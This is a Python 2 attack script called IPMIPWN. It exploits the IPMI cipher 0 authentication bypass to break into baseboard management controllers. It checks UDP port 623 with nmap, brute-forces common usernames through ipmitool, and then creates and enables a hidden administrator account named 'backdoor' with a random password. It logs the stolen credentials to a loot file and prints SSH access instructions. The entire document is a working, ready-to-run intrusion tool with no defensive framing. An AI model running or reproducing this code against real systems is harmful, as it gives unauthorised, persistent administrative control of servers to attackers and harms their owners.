#!/usr/bin/python
import os, sys, commands, random, string, time

USERNAMES = ['root','admin','ADMIN', 'ROOT', 'Administrator', 'USERID', 'guest', 'itops.admin', 'ITOps.Admin']

def INIT(HOST, USERNAMES):
 print "[*] Checking if "+HOST+" is up..."
 ISON = ALIVECHECK(HOST)
 if ISON == 0:
  DEAD()
 else:
  print "[*] Checking for access..."
  USER=FINDUSER(HOST, USERNAMES)
  print "[*] We have access as "+USER+" :)"
  BACKDOOR(USER, HOST)

def USAGE():
 print "[-] IPMIPWN by Adam Espitia"
 print "[-] aahideaway.blogspot.com"
 print "[-] @anarchyang31"
 print ""
 print "[-] USAGE: python ipmipwn.py <IP>"
 print ""
 print "[-] IPMIPWN will attempt to setup a backdoor on IPMI servers"
 print "[-] exploiting the authentication bypass via cipher 0 vuln."

def BACKDOOR(USER, HOST):
 print "[*] Setting up backdoor..."
 RAWDATA = commands.getstatusoutput("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user summary")
 PDATA = str(RAWDATA).split("Enabled User Count  :")
 P2DATA = PDATA[1].split("\\n")
 USERCOUNT = str(int(P2DATA[0].strip())+1)
 USERNAME = "backdoor"+USERCOUNT
 PW = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
 os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user set name "+USERCOUNT+" "+USERNAME)
 os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user set password "+USERCOUNT+" "+PW)
 os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user priv "+USERCOUNT+" 4")
 os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user enable "+USERCOUNT)
 os.popen('echo "'+HOST+':'+USERNAME+':'+PW+'" >> loot.log')
 print "[*] Done, access system using ssh as follows:"
 print "[*] ssh "+USERNAME+"@"+HOST
 print "[*] The password is "+PW
 print "[*] Enjoy!"


def ALIVECHECK(HOST):
 OUTPUT = os.popen('nmap -sU -T5 --open -p 623 '+HOST).read()
 PO = str(OUTPUT).find("open")
 #print PO
 if PO == -1:
  return 0
 else:
  return 1

def FINDUSER(HOST, USERNAMES):
 for USER in USERNAMES:
  time.sleep(5)
  print "[*] Trying "+USER+"..."
  OUTPUT = commands.getstatusoutput('ipmitool -I lanplus -C 0 -U '+USER+' -P hacked -H '+HOST+' user list')
  #print OUTPUT
  if str(OUTPUT).find("Unable to establish IPMI") == -1:
   return USER
 FAIL()

def FAIL():
 print "[!] Could not get access. :("
 exit()

def DEAD():
 print "[!] Host is not listening on port 623"
 exit()

if len(sys.argv) == 1:
 USAGE()
else:
 INIT(sys.argv[1], USERNAMES)
